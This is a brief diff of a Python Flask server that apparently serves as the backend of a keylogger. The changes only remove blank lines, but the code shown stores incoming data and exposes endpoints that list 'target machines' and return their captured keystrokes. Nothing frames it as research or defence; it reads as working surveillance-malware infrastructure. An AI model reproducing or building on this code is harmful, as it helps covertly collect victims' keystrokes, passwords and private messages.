@@ -80,11 +80,7 @@ def write_to_file(data: dict):
             print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
 
         print(json.dumps(merged_data1, indent=4, ensure_ascii=False))
-
     return 200
-
-
-
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
 def get_machines():
@@ -93,7 +89,6 @@ def get_machines():
         return jsonify([])
     machines = os.listdir(LOG_DIR)
     return jsonify(machines)
-
 
 @app.route('/api/get_keystrokes', methods=['GET'])
 def get_keystrokes():
@@ -113,7 +108,6 @@ def get_keystrokes():
             data.append(f.read())
 
     return jsonify(data)
-
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
